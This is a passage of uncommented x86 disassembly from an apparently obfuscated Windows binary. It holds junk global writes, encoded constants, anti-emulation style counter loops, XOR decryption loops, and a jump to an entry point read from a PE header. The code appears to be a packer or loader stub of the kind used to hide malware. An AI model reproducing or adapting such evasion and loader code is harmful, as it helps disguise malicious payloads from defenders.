  401e28:	cmp    DWORD PTR [ebp-0x58],edx
  401e2b:	mov    DWORD PTR ds:0x42b010,0x6d5c
  401e35:	je     0x401eba
  401e3b:	mov    edx,DWORD PTR ds:0x42e2b7
  401e41:	and    DWORD PTR ds:0x429000,0x42b000
  401e4b:	mov    edx,DWORD PTR [edx+0x1c0]
  401e51:	add    DWORD PTR ds:0x42b008,0x42a018
  401e5b:	mov    edx,DWORD PTR [edx]
  401e5d:	xor    ebx,ebx
  401e5f:	adc    DWORD PTR ds:0x42d008,0x116
  401e69:	add    edx,eax
  401e6b:	mov    DWORD PTR ds:0x429000,0x1bcd
  401e75:	adc    ebx,0xffffffff
  401e78:	and    DWORD PTR ds:0x429014,0x42b018
  401e82:	xor    edx,ecx
  401e84:	and    DWORD PTR ds:0x42c004,0x1735
  401e8e:	xor    ebx,0x0
  401e91:	mov    DWORD PTR ds:0x42d01c,0x82d
  401e9b:	cmp    edx,0x70941fc5
  401ea1:	mov    DWORD PTR ds:0x42c01c,0x36f6
  401eab:	jne    0x4025c2
  401eb1:	cmp    ebx,0xffffffff
  401eb4:	jne    0x4025c2
  401eba:	mov    edx,DWORD PTR ds:0x429008
  401ec0:	add    DWORD PTR ds:0x42b018,edx
  401ec6:	mov    edx,DWORD PTR ds:0x42e333
  401ecc:	and    DWORD PTR ds:0x42a000,0x1639
  401ed6:	mov    ebx,DWORD PTR ds:0x42e33b
  401edc:	adc    DWORD PTR ds:0x429008,0x42d000
  401ee6:	xor    edx,ebx
  401ee8:	sub    DWORD PTR ds:0x42b018,ecx
  401eee:	mov    DWORD PTR ds:0x42e333,edx
  401ef4:	sbb    DWORD PTR ds:0x42a000,0x162a
  401efe:	mov    ebx,DWORD PTR ds:0x42e333
  401f04:	mov    edx,DWORD PTR [ebp-0x48]
  401f07:	add    DWORD PTR ds:0x429010,0x42ec
  401f11:	add    DWORD PTR [edx],ebx
  401f13:	jmp    0x402583
  401f18:	mov    eax,DWORD PTR [ebp-0x3c]
  401f1b:	mov    DWORD PTR ds:0x42c014,0x53e4
  401f25:	cmp    eax,0xf89c8584
  401f2a:	je     0x402096
  401f30:	movzx  eax,BYTE PTR ds:0x42b014
  401f37:	sub    DWORD PTR ds:0x42d000,eax
  401f3d:	mov    eax,DWORD PTR [ebp-0x8]
  401f40:	mov    ecx,DWORD PTR ds:0x42a000
  401f46:	add    DWORD PTR ds:0x42d018,ecx
  401f4c:	mov    ecx,DWORD PTR [ebp-0x44]
  401f4f:	xor    DWORD PTR ds:0x42b008,0x5e29
  401f59:	xor    eax,esi
  401f5b:	sub    DWORD PTR ds:0x42a018,0x7df1
  401f65:	add    eax,edi
  401f67:	cmp    eax,ecx
  401f69:	mov    DWORD PTR ds:0x42b008,0x3297
  401f73:	je     0x402096
  401f79:	and    DWORD PTR ds:0x429018,0x0
  401f83:	mov    eax,ds:0x429018
  401f88:	inc    eax
  401f89:	mov    ds:0x429018,eax
  401f8e:	cmp    DWORD PTR ds:0x429018,0x1f
  401f95:	jne    0x401fa6
  401f9b:	push   0x51be
  401fa0:	call   DWORD PTR ds:0x42e913
  401fa6:	cmp    DWORD PTR ds:0x429018,0x1d
  401fad:	jb     0x401f83
  401fb3:	adc    DWORD PTR ds:0x42d01c,edx
  401fb9:	mov    eax,ds:0x42e2b7
  401fbe:	or     ecx,DWORD PTR ds:0x42d01c
  401fc4:	mov    eax,DWORD PTR [eax+0x194]
  401fca:	mov    ecx,DWORD PTR [eax]
  401fcc:	and    DWORD PTR ds:0x42d01c,0x0
  401fd6:	jmp    0x401fe6
  401fdb:	mov    eax,ds:0x42d01c
  401fe0:	inc    eax
  401fe1:	mov    ds:0x42d01c,eax
  401fe6:	cmp    DWORD PTR ds:0x42d01c,0x19
  401fed:	jae    0x40201a
  401ff3:	cmp    DWORD PTR ds:0x42d01c,0x26
  401ffa:	jne    0x402015
  402000:	push   0x8d10
  402005:	push   0x42e026
  40200a:	push   0x42c010
  40200f:	call   DWORD PTR ds:0x42e917
  402015:	jmp    0x401fdb
  40201a:	mov    eax,DWORD PTR [ecx+0x3c]
  40201d:	not    DWORD PTR ds:0x42b01c
  402023:	push   DWORD PTR ds:0x42e38f
  402029:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40202d:	or     DWORD PTR ds:0x42b014,0x372f
  402037:	push   DWORD PTR ds:0x42e13b
  40203d:	or     DWORD PTR ds:0x42a01c,0x1f3e
  402047:	add    eax,ecx
  402049:	sub    DWORD PTR ds:0x42c014,ebx
  40204f:	mov    ecx,DWORD PTR ds:0x42e2b7
  402055:	mov    ecx,DWORD PTR [ecx+0x194]
  40205b:	sbb    DWORD PTR ds:0x429008,0x42b010
  402065:	push   DWORD PTR [ecx]
  402067:	xor    DWORD PTR ds:0x42d004,0x42a014
  402071:	call   eax
  402073:	mov    ecx,DWORD PTR ds:0x42b00c
  402079:	mov    ecx,DWORD PTR ds:0x42e2b7
  40207f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  402085:	mov    DWORD PTR [ecx],eax
  402087:	mov    DWORD PTR ds:0x42b004,0x40bc
  402091:	jmp    0x4025c2
  402096:	add    DWORD PTR ds:0x429028,0x10ff
  4020a0:	mov    eax,DWORD PTR [ebp-0x8]
  4020a3:	mov    ecx,DWORD PTR [ebp-0x7c]
  4020a6:	xor    eax,esi
  4020a8:	add    eax,edi
  4020aa:	cmp    eax,ecx
  4020ac:	jne    0x40247d
  4020b2:	mov    eax,DWORD PTR [ebp-0x8]
  4020b5:	mov    ecx,DWORD PTR ds:0x42e2b7
  4020bb:	mov    ecx,DWORD PTR [ecx+0x198]
  4020c1:	xor    eax,esi
  4020c3:	add    eax,edi
  4020c5:	cmp    eax,DWORD PTR [ecx]
  4020c7:	jne    0x4020e6
  4020cd:	mov    eax,DWORD PTR [ebp-0x8]
  4020d0:	push   0xf89c8585
  4020d5:	xor    eax,esi
  4020d7:	add    eax,edi
  4020d9:	push   eax
  4020da:	push   ebx
  4020db:	push   DWORD PTR [ebp-0xc]
  4020de:	push   DWORD PTR [ebp-0x8]
  4020e1:	call   0x405799
  4020e6:	mov    eax,DWORD PTR [ebp-0xc]
  4020e9:	mov    DWORD PTR [ebp-0x40],eax
  4020ec:	mov    eax,DWORD PTR [ebp-0x8]
  4020ef:	mov    DWORD PTR [ebp-0x1c],eax
  4020f2:	mov    eax,DWORD PTR [ebp-0x1c]
  4020f5:	xor    eax,esi
  4020f7:	add    eax,edi
  4020f9:	mov    DWORD PTR [ebp+0x10],eax
  4020fc:	mov    eax,ds:0x42e137
  402101:	mov    eax,DWORD PTR [eax]
  402103:	mov    DWORD PTR [ebp+0x10],eax
  402106:	mov    eax,ds:0x42e33f
  40210b:	mov    eax,DWORD PTR [eax]
  40210d:	mov    DWORD PTR [ebp-0x18],eax
  402110:	mov    DWORD PTR [ebp+0xc],0xf89c8785
  402117:	mov    eax,DWORD PTR [ebp+0xc]
  40211a:	xor    eax,esi
  40211c:	add    eax,edi
  40211e:	mov    DWORD PTR [ebp+0xc],eax
  402121:	mov    eax,ds:0x42e2b7
  402126:	mov    DWORD PTR [ebp+0xc],eax
  402129:	mov    eax,DWORD PTR [ebp+0x10]
  40212c:	mov    DWORD PTR [ebp+0xc],eax
  40212f:	mov    eax,DWORD PTR [ebp+0xc]
  402132:	push   0x4
  402134:	pop    ecx
  402135:	sub    ecx,eax
  402137:	add    ecx,DWORD PTR [ebp-0x18]
  40213a:	mov    DWORD PTR [ebp-0x30],0xf89c85c5
  402141:	mov    DWORD PTR [ebp+0x10],ecx
  402144:	mov    DWORD PTR [ebp-0xe4],ebx
  40214a:	mov    eax,DWORD PTR [ebp+0xc]
  40214d:	mov    DWORD PTR [ebp-0xe0],eax
  402153:	mov    eax,DWORD PTR [ebp+0x10]
  402156:	mov    DWORD PTR [ebp-0xdc],eax
  40215c:	mov    eax,DWORD PTR [ebp-0x30]
  40215f:	xor    eax,esi
  402161:	add    eax,edi
  402163:	mov    DWORD PTR [ebp-0xd8],eax
  402169:	lea    eax,[ebp-0x88]
  40216f:	mov    DWORD PTR [ebp-0xd4],eax
  402175:	mov    eax,DWORD PTR [ebp-0xe4]
  40217b:	xor    eax,esi
  40217d:	add    eax,edi
  40217f:	mov    DWORD PTR [ebp-0xe4],eax
  402185:	lea    eax,[ebp-0xe4]
  40218b:	push   eax
  40218c:	mov    eax,DWORD PTR [ebp-0x40]
  40218f:	xor    eax,esi
  402191:	add    eax,edi
  402193:	push   eax
  402194:	mov    eax,ds:0x42e2d7
  402199:	push   0x42e22d
  40219e:	push   DWORD PTR [eax]
  4021a0:	call   0x40294c
  4021a5:	mov    eax,DWORD PTR [ebp+0xc]
  4021a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4021ab:	mov    DWORD PTR [ebp-0x84],ecx
  4021b1:	mov    ecx,DWORD PTR [ebp-0x1c]
  4021b4:	xor    ecx,esi
  4021b6:	mov    DWORD PTR [ebp-0x18],eax
  4021b9:	add    ecx,edi
  4021bb:	jmp    0x40241e
  4021c0:	lea    edx,[ecx+eax*1]
  4021c3:	mov    DWORD PTR [ebp+0x10],edx
  4021c6:	mov    edx,DWORD PTR [ebp-0x84]
  4021cc:	sub    edx,ecx
  4021ce:	mov    DWORD PTR [ebp+0xc],edx
  4021d1:	mov    edx,DWORD PTR [ebp+0xc]
  4021d4:	mov    DWORD PTR [ebp-0x60],edx
  4021d7:	mov    edx,DWORD PTR [ebp+0x10]
  4021da:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  4021e1:	mov    DWORD PTR [ebp-0x6c],edx
  4021e4:	mov    DWORD PTR [ebp-0x20],0xf89c8584
  4021eb:	mov    edx,DWORD PTR [ebp-0x54]
  4021ee:	xor    edx,esi
  4021f0:	add    edx,edi
  4021f2:	mov    DWORD PTR [ebp+0x10],edx
  4021f5:	mov    edx,DWORD PTR [ebp-0x54]
  4021f8:	xor    edx,esi
  4021fa:	add    edx,edi
  4021fc:	mov    DWORD PTR [ebp+0xc],edx
  4021ff:	mov    DWORD PTR [ebp-0x68],0xf89c85a5
  402206:	mov    DWORD PTR [ebp-0x74],0xf89c85be
  40220d:	mov    edx,DWORD PTR [ebp-0x54]
  402210:	mov    ebx,DWORD PTR [ebp-0x60]
  402213:	xor    edx,esi
  402215:	add    edx,edi
  402217:	cmp    ebx,edx
  402219:	je     0x402412
  40221f:	mov    eax,DWORD PTR [ebp-0x20]
  402222:	xor    eax,esi
  402224:	mov    edx,0xffcd8d1e
  402229:	sub    edx,eax
  40222b:	add    edx,DWORD PTR [ebp-0x60]
  40222e:	mov    eax,DWORD PTR [ebp-0x20]
  402231:	mov    ebx,DWORD PTR [ebp+0x10]
  402234:	xor    eax,esi
  402236:	add    eax,edi
  402238:	imul   eax,ebx
  40223b:	cmp    eax,edx
  40223d:	ja     0x40240f
  402243:	mov    edx,DWORD PTR [ebp+0x10]
  402246:	mov    eax,DWORD PTR [ebp-0x60]
  402249:	mov    ebx,DWORD PTR [ebp-0x68]
  40224c:	sub    eax,edx
  40224e:	xor    ebx,esi
  402250:	xor    edx,edx
  402252:	add    ebx,edi
  402254:	div    ebx
  402256:	mov    DWORD PTR [ebp+0xc],eax
  402259:	mov    eax,DWORD PTR [ebp-0x74]
  40225c:	mov    edx,DWORD PTR [ebp+0xc]
  40225f:	xor    eax,esi
  402261:	add    eax,edi
  402263:	cmp    edx,eax
  402265:	jbe    0x402275
  40226b:	mov    eax,DWORD PTR [ebp-0x74]
  40226e:	xor    eax,esi
  402270:	add    eax,edi
  402272:	mov    DWORD PTR [ebp+0xc],eax
  402275:	mov    eax,DWORD PTR [ebp-0x68]
  402278:	mov    edx,DWORD PTR [ebp+0xc]
  40227b:	xor    eax,esi
  40227d:	add    eax,edi
  40227f:	imul   eax,edx
  402282:	mov    DWORD PTR [ebp+0xc],eax
  402285:	mov    eax,DWORD PTR [ebp-0x54]
  402288:	mov    edx,DWORD PTR [ebp+0xc]
  40228b:	xor    eax,esi
  40228d:	add    eax,edi
  40228f:	cmp    edx,eax
  402291:	je     0x4023f8
  402297:	mov    eax,DWORD PTR [ebp+0xc]
  40229a:	mov    DWORD PTR [ebp-0x34],eax
  40229d:	mov    eax,DWORD PTR [ebp+0x10]
  4022a0:	add    eax,DWORD PTR [ebp-0x6c]
  4022a3:	mov    DWORD PTR [ebp-0x30],0xf89c8585
  4022aa:	mov    DWORD PTR [ebp-0x28],eax
  4022ad:	mov    eax,0xf89c8584
  4022b2:	mov    DWORD PTR [ebp-0x64],eax
  4022b5:	mov    DWORD PTR [ebp-0x58],0xf89c85bb
  4022bc:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4022c3:	mov    DWORD PTR [ebp-0x38],eax
  4022c6:	mov    eax,DWORD PTR [ebp-0x30]
  4022c9:	xor    eax,esi
  4022cb:	add    eax,edi
  4022cd:	jmp    0x4023b4
  4022d2:	mov    DWORD PTR [ebp-0x78],0xf89c85b3
  4022d9:	mov    DWORD PTR [ebp-0x80],0xf89c85a9
  4022e0:	mov    eax,DWORD PTR [ebp-0x38]
  4022e3:	mov    edx,DWORD PTR [ebp+0xc]
  4022e6:	xor    eax,esi
  4022e8:	add    eax,edi
  4022ea:	imul   eax,edx
  4022ed:	mov    edx,DWORD PTR [ebp-0x28]
  4022f0:	mov    al,BYTE PTR [eax+edx*1]
  4022f3:	mov    BYTE PTR [ebp-0x1],al
  4022f6:	mov    eax,DWORD PTR [ebp-0x38]
  4022f9:	mov    edx,DWORD PTR [ebp+0xc]
  4022fc:	xor    eax,esi
  4022fe:	add    eax,edi
  402300:	imul   eax,edx
  402303:	mov    edx,DWORD PTR [ebp-0x58]
  402306:	xor    edx,esi
  402308:	add    eax,edx
  40230a:	mov    edx,DWORD PTR [ebp-0x28]
  40230d:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e2]
  402315:	mov    edx,DWORD PTR [ebp-0x78]
  402318:	xor    edx,esi
  40231a:	lea    eax,[edx+eax*1+0x3272e2]
  402321:	movzx  edx,BYTE PTR [ebp-0x1]
  402325:	xor    edx,eax
  402327:	mov    BYTE PTR [ebp-0x1],dl
  40232a:	mov    al,BYTE PTR [ebp-0x1]
  40232d:	mov    edx,DWORD PTR [ebp-0x38]
  402330:	mov    ebx,DWORD PTR [ebp+0xc]
  402333:	xor    edx,esi
  402335:	add    edx,edi
  402337:	imul   edx,ebx
  40233a:	mov    ebx,DWORD PTR [ebp-0x28]
  40233d:	mov    BYTE PTR [edx+ebx*1],al
  402340:	mov    eax,DWORD PTR [ebp-0x38]
  402343:	mov    edx,DWORD PTR [ebp+0xc]
  402346:	xor    eax,esi
  402348:	add    eax,edi
  40234a:	imul   eax,edx
  40234d:	mov    edx,DWORD PTR [ebp-0x28]
  402350:	mov    al,BYTE PTR [eax+edx*1]
  402353:	mov    BYTE PTR [ebp-0x1],al
  402356:	mov    eax,DWORD PTR [ebp-0x38]
  402359:	mov    edx,DWORD PTR [ebp+0xc]
  40235c:	xor    eax,esi
  40235e:	add    eax,edi
  402360:	imul   eax,edx
  402363:	mov    edx,DWORD PTR [ebp-0x64]
  402366:	xor    edx,esi
  402368:	add    eax,edx
  40236a:	mov    edx,DWORD PTR [ebp-0x28]
  40236d:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e2]
  402375:	mov    edx,DWORD PTR [ebp-0x80]
  402378:	xor    edx,esi
  40237a:	lea    eax,[edx+eax*1+0x3272e2]
  402381:	movzx  edx,BYTE PTR [ebp-0x1]
  402385:	xor    edx,eax
  402387:	mov    BYTE PTR [ebp-0x1],dl
  40238a:	mov    al,BYTE PTR [ebp-0x1]
  40238d:	mov    edx,DWORD PTR [ebp-0x38]
  402390:	mov    ebx,DWORD PTR [ebp+0xc]
  402393:	xor    edx,esi
  402395:	add    edx,edi
  402397:	imul   edx,ebx
  40239a:	mov    ebx,DWORD PTR [ebp-0x28]
  40239d:	mov    BYTE PTR [edx+ebx*1],al
  4023a0:	mov    eax,DWORD PTR [ebp-0x10]
  4023a3:	mov    edx,DWORD PTR [ebp-0x64]
  4023a6:	xor    eax,esi
  4023a8:	xor    edx,esi
  4023aa:	add    eax,edi
  4023ac:	add    edx,edi
  4023ae:	imul   eax,edx
  4023b1:	add    eax,DWORD PTR [ebp+0xc]
  4023b4:	mov    DWORD PTR [ebp+0xc],eax
  4023b7:	mov    eax,DWORD PTR [ebp+0xc]
  4023ba:	mov    edx,DWORD PTR [ebp-0x34]
  4023bd:	cmp    edx,eax
  4023bf:	jb     0x4022d2
  4023c5:	mov    eax,DWORD PTR [ebp-0x64]
  4023c8:	mov    edx,DWORD PTR [ebp-0x34]
  4023cb:	xor    eax,esi
  4023cd:	add    eax,edi
  4023cf:	imul   eax,edx
  4023d2:	mov    edx,DWORD PTR [ebp-0x30]
  4023d5:	xor    edx,esi
  4023d7:	add    edx,edi
  4023d9:	or     eax,edx
  4023db:	mov    edx,DWORD PTR [ebp-0x20]
  4023de:	xor    edx,esi
  4023e0:	add    eax,edx
  4023e2:	mov    edx,DWORD PTR [ebp-0x20]
  4023e5:	xor    edx,esi
  4023e7:	add    eax,edx
  4023e9:	mov    edx,DWORD PTR [ebp+0x10]
  4023ec:	lea    eax,[eax+edx*1+0x64e5c4]
  4023f3:	jmp    0x402407
  4023f8:	mov    eax,DWORD PTR [ebp-0x20]
  4023fb:	mov    edx,DWORD PTR [ebp+0x10]
  4023fe:	xor    eax,esi
  402400:	lea    eax,[eax+edx*1+0x3272e2]
  402407:	mov    DWORD PTR [ebp+0x10],eax
  40240a:	jmp    0x40221f
  40240f:	mov    eax,DWORD PTR [ebp-0x18]
  402412:	mov    edx,DWORD PTR [ebp-0x40]
  402415:	xor    edx,esi
  402417:	lea    ecx,[ecx+edx*1+0x3272e2]
  40241e:	lea    edx,[ecx-0x3272e2]
  402424:	xor    edx,esi
  402426:	cmp    edx,0xf89c9585
  40242c:	jne    0x4021c0
  402432:	mov    ecx,DWORD PTR [ebp-0x1c]
  402435:	mov    edx,DWORD PTR [ebp-0x40]
  402438:	mov    ebx,DWORD PTR [ebp-0x1c]
  40243b:	xor    edx,esi
  40243d:	mov    dl,BYTE PTR [edx+eax*1+0x3272e2]
  402444:	xor    ecx,esi
  402446:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  40244d:	xor    ebx,esi
  40244f:	mov    BYTE PTR [ebx+eax*1+0x3272e2],dl
  402456:	mov    edx,DWORD PTR [ebp-0x40]
  402459:	xor    edx,esi
  40245b:	mov    BYTE PTR [edx+eax*1+0x3272e2],cl
  402462:	mov    eax,DWORD PTR [ebp-0x40]
  402465:	mov    eax,DWORD PTR [ebp-0x8]
  402468:	xor    eax,esi
  40246a:	add    eax,edi
  40246c:	mov    ds:0x42e33b,eax
  402471:	mov    eax,DWORD PTR [ebp-0x8]
  402474:	xor    eax,esi
  402476:	add    eax,edi
  402478:	mov    ds:0x42e333,eax
  40247d:	lea    eax,[ebp-0x2c]
  402480:	mov    DWORD PTR [ebp-0x90],eax
  402486:	lea    eax,[ebp+0x4]
  402489:	mov    DWORD PTR [ebp-0x2c],eax
  40248c:	mov    eax,DWORD PTR [ebp-0x2c]
  40248f:	test   eax,eax
  402491:	je     0x4025c2
  402497:	mov    DWORD PTR [ebp-0xa0],0xf152c3c
  4024a1:	mov    DWORD PTR [ebp-0x98],0x712ed0f
  4024ab:	mov    DWORD PTR [ebp-0x8c],0x373fc2d
  4024b5:	mov    DWORD PTR [ebp-0x94],0x72670a1d
  4024bf:	call   0x405403
  4024c4:	mov    eax,DWORD PTR [ebp-0x24]
  4024c7:	mov    eax,DWORD PTR [ebp-0xc]
  4024ca:	mov    eax,DWORD PTR [ebp-0x8]
  4024cd:	mov    DWORD PTR [ebp+0xc],eax
  4024d0:	mov    eax,eax
  4024d2:	mov    eax,ds:0x42e2b7
  4024d7:	mov    eax,DWORD PTR [eax+0x1c8]
  4024dd:	mov    eax,DWORD PTR [eax]
  4024df:	cdq    
  4024e0:	mov    ebx,eax
  4024e2:	mov    eax,0xfabdbee7
  4024e7:	add    ebx,eax
  4024e9:	adc    edx,0xffffffff
  4024ec:	and    DWORD PTR [ebp-0x10],0x0
  4024f0:	xor    edx,0x0
  4024f3:	mov    DWORD PTR [ebp-0x6c],edx
  4024f6:	mov    edx,DWORD PTR [ebp+0xc]
  4024f9:	mov    DWORD PTR [ebp-0x14],edx
  4024fc:	mov    ecx,0x8a29a12d
  402501:	xor    ebx,ecx
  402503:	add    DWORD PTR [ebp-0x14],eax
  402506:	mov    edx,DWORD PTR [ebp-0x14]
  402509:	adc    DWORD PTR [ebp-0x10],0xffffffff
  40250d:	xor    edx,ecx
  40250f:	mov    DWORD PTR [ebp-0x5c],edx
  402512:	mov    edx,DWORD PTR [ebp-0x10]
  402515:	xor    edx,0x0
  402518:	mov    DWORD PTR [ebp-0x58],edx
  40251b:	cmp    DWORD PTR [ebp-0x5c],ebx
  40251e:	jne    0x402530
  402524:	mov    edx,DWORD PTR [ebp-0x6c]
  402527:	cmp    DWORD PTR [ebp-0x58],edx
  40252a:	je     0x40255f
  402530:	mov    edx,DWORD PTR ds:0x42e2b7
  402536:	mov    edx,DWORD PTR [edx+0x1c0]
  40253c:	mov    edx,DWORD PTR [edx]
  40253e:	xor    ebx,ebx
  402540:	add    edx,eax
  402542:	adc    ebx,0xffffffff
  402545:	xor    edx,ecx
  402547:	xor    ebx,0x0
  40254a:	cmp    edx,0x70941fc5
  402550:	jne    0x4025c2
  402556:	cmp    ebx,0xffffffff
  402559:	jne    0x4025c2
  40255f:	mov    edx,DWORD PTR ds:0x42e333
  402565:	mov    ebx,DWORD PTR ds:0x42e33b
  40256b:	xor    edx,ebx
  40256d:	mov    DWORD PTR ds:0x42e333,edx
  402573:	mov    edx,DWORD PTR [ebp-0x2c]
  402576:	mov    ebx,DWORD PTR ds:0x42e333
  40257c:	add    ebx,DWORD PTR [edx]
  40257e:	mov    edx,DWORD PTR [ebp-0x2c]
  402581:	mov    DWORD PTR [edx],ebx
  402583:	mov    edx,DWORD PTR [ebp+0xc]
  402586:	xor    esi,edx
  402588:	mov    edx,DWORD PTR ds:0x42e333
  40258e:	add    esi,edi
  402590:	xor    ebx,ebx
  402592:	add    esi,eax
  402594:	adc    ebx,0xffffffff
  402597:	xor    edi,edi
  402599:	xor    esi,ecx
  40259b:	xor    ebx,0x0
  40259e:	add    edx,eax
  4025a0:	adc    edi,0xffffffff
  4025a3:	xor    edx,ecx
  4025a5:	xor    edi,0x0
  4025a8:	cmp    edx,esi
  4025aa:	jne    0x4025c2
  4025b0:	cmp    edi,ebx
  4025b2:	jne    0x4025c2
  4025b8:	mov    eax,ds:0x42e333
  4025bd:	mov    ds:0x42e33b,eax
  4025c2:	mov    eax,ds:0x42e2b7
  4025c7:	push   0x4
  4025c9:	add    eax,0x1cc
  4025ce:	push   eax
  4025cf:	lea    eax,[ebp-0x24]
  4025d2:	push   eax
  4025d3:	call   0x4025f2
  4025d8:	mov    eax,DWORD PTR [ebp-0x24]
  4025db:	mov    eax,DWORD PTR [eax]
  4025dd:	pop    ebx
  4025de:	pop    esi
  4025df:	pop    edi
  4025e0:	leave  
  4025e1:	ret    0xc
  4025e4:	xor    eax,eax
  4025e6:	sbb    DWORD PTR ds:0x42c018,0x42b010
  4025f0:	inc    eax
  4025f1:	ret    
  4025f2:	push   ebp
  4025f3:	mov    ebp,esp
  4025f5:	sub    esp,0x10
  4025f8:	mov    eax,0xf89c8585
  4025fd:	and    DWORD PTR ds:0x429018,0x0
  402607:	mov    edx,DWORD PTR ds:0x429018
  40260d:	inc    edx
  40260e:	mov    DWORD PTR ds:0x429018,edx
  402614:	cmp    DWORD PTR ds:0x429018,0x8
  40261b:	jne    0x402627
  402621:	call   DWORD PTR ds:0x42e91b
  402627:	cmp    DWORD PTR ds:0x429018,0x7
  40262e:	jne    0x402641
  402634:	mov    edx,DWORD PTR ds:0x429018
  40263a:	inc    edx
  40263b:	mov    DWORD PTR ds:0x429018,edx
  402641:	cmp    DWORD PTR ds:0x429018,0x10
  402648:	jb     0x402607
  40264e:	mov    DWORD PTR [ebp-0x4],eax
  402651:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  402658:	movzx  edx,BYTE PTR ds:0x42b010
  40265f:	add    DWORD PTR ds:0x42d000,edx
  402665:	mov    ecx,DWORD PTR [ebp-0x4]
  402668:	not    DWORD PTR ds:0x42d008
  40266e:	push   esi
  40266f:	and    DWORD PTR ds:0x42c00c,edx
  402675:	mov    edx,0x751089b
  40267a:	movzx  esi,BYTE PTR ds:0x429014
  402681:	sbb    DWORD PTR ds:0x429024,esi
  402687:	xor    ecx,edx
  402689:	xor    esi,0xd57
  40268f:	mov    esi,0x3272e2
  402694:	push   edi
  402695:	or     DWORD PTR ds:0x42d00c,edx
  40269b:	mov    edi,DWORD PTR [ebp+0x10]
  40269e:	neg    DWORD PTR ds:0x42d018
  4026a4:	add    ecx,esi
  4026a6:	mov    DWORD PTR ds:0x42d000,0x5b5a
  4026b0:	cmp    ecx,edi
  4026b2:	je     0x4027fd
  4026b8:	mov    ecx,DWORD PTR [ebp-0x4]
  4026bb:	or     DWORD PTR ds:0x42b000,0x2b6e
  4026c5:	mov    edi,DWORD PTR [ebp+0x10]
  4026c8:	and    DWORD PTR ds:0x429018,0x429014
  4026d2:	xor    eax,eax
  4026d4:	xor    ecx,edx
  4026d6:	add    ecx,esi
  4026d8:	or     DWORD PTR ds:0x42d014,0x42a010
  4026e2:	add    edi,0xfabdbee7
  4026e8:	adc    eax,0xffffffff
  4026eb:	xor    eax,0x0
  4026ee:	mov    DWORD PTR [ebp-0xc],eax
  4026f1:	mov    eax,ds:0x41cddc
  4026f6:	mov    eax,DWORD PTR [eax]
  4026f8:	xor    DWORD PTR ds:0x42d01c,eax
  4026fe:	push   ebx
  4026ff:	mov    DWORD PTR ds:0x429024,0x1a
  402709:	cmp    DWORD PTR ds:0x429024,0x0
  402710:	je     0x40275a
  402716:	cmp    DWORD PTR ds:0x429024,0xa
  40271d:	jne    0x40272f
  402723:	push   DWORD PTR [ebp-0x24]
  402726:	push   DWORD PTR [ebp-0x20]
  402729:	call   DWORD PTR ds:0x42e91f
  40272f:	cmp    DWORD PTR ds:0x429024,0xb
  402736:	jne    0x40274a
  40273c:	xor    eax,eax
  40273e:	xor    eax,DWORD PTR ds:0x429024
  402744:	dec    eax
  402745:	mov    ds:0x429024,eax
  40274a:	mov    eax,ds:0x429024
  40274f:	dec    eax
  402750:	mov    ds:0x429024,eax
  402755:	jmp    0x402709
  40275a:	xor    ebx,ebx
  40275c:	xor    edi,0x8a29a12d
  402762:	mov    eax,ecx
  402764:	add    eax,0xfabdbee7
  402769:	adc    ebx,0xffffffff
  40276c:	xor    eax,0x8a29a12d
  402771:	xor    ebx,0x0
  402774:	cmp    eax,edi
  402776:	jne    0x40278f
  40277c:	cmp    ebx,DWORD PTR [ebp-0xc]
  40277f:	je     0x4027f7
  402785:	jmp    0x40278f
  40278a:	mov    esi,0x3272e2
  40278f:	mov    eax,DWORD PTR [ebp-0x4]
  402792:	mov    edi,DWORD PTR [ebp-0x8]
  402795:	xor    edi,edx
  402797:	add    edi,esi
  402799:	mov    esi,DWORD PTR [ebp+0x8]
  40279c:	imul   edi,ecx
  40279f:	mov    ebx,DWORD PTR [ebp+0xc]
  4027a2:	xor    eax,edx
  4027a4:	add    eax,ecx
  4027a6:	mov    al,BYTE PTR [ebx+eax*1+0x3272e2]
  4027ad:	mov    BYTE PTR [edi+esi*1],al
  4027b0:	mov    eax,DWORD PTR [ebp-0x8]
  4027b3:	mov    esi,DWORD PTR [ebp+0x10]
  4027b6:	xor    eax,edx
  4027b8:	xor    ebx,ebx
  4027ba:	add    esi,0xfabdbee7
  4027c0:	adc    ebx,0xffffffff
  4027c3:	lea    ecx,[ecx+eax*1+0x3272e2]
  4027ca:	xor    edi,edi
  4027cc:	xor    esi,0x8a29a12d
  4027d2:	xor    ebx,0x0
  4027d5:	mov    eax,ecx
  4027d7:	add    eax,0xfabdbee7
  4027dc:	adc    edi,0xffffffff
  4027df:	xor    eax,0x8a29a12d
  4027e4:	xor    edi,0x0
  4027e7:	cmp    eax,esi
  4027e9:	jne    0x40278a
  4027ef:	cmp    edi,ebx
  4027f1:	jne    0x40278a
  4027f7:	mov    eax,0xf89c8584
  4027fc:	pop    ebx
  4027fd:	pop    edi
  4027fe:	pop    esi
  4027ff:	leave  
  402800:	ret    0xc
  402803:	push   ebp
  402804:	mov    ebp,esp
  402806:	push   ecx
  402807:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  40280e:	mov    DWORD PTR ds:0x429028,0x19
  402818:	cmp    DWORD PTR ds:0x429028,0x0
  40281f:	je     0x402853
  402825:	cmp    DWORD PTR ds:0x429028,0x1c
  40282c:	jne    0x40283d
  402832:	push   0x6b9f
  402837:	call   DWORD PTR ds:0x42e8b7
  40283d:	mov    eax,ds:0x429028
  402842:	dec    eax
  402843:	mov    ds:0x429028,eax
  402848:	jmp    0x402818
  40284d:	or     DWORD PTR ds:0x429014,ecx
  402853:	mov    eax,DWORD PTR [ebp+0x8]
  402856:	adc    edx,0x6b36
  40285c:	movsx  eax,BYTE PTR [eax]
  40285f:	and    ecx,0x6f50
  402865:	mov    edx,0x3272e2
  40286a:	and    DWORD PTR ds:0x429014,0x58e
  402874:	sub    eax,edx
  402876:	mov    DWORD PTR ds:0x42d000,0x12
  402880:	cmp    DWORD PTR ds:0x42d000,0x0
  402887:	je     0x402906
  40288d:	cmp    DWORD PTR ds:0x42d000,0x5
  402894:	jne    0x4028da
  40289a:	push   0x42e041
  40289f:	push   0x7a69
  4028a4:	push   DWORD PTR [ebp-0x10]
  4028a7:	push   DWORD PTR [ebp-0x10]
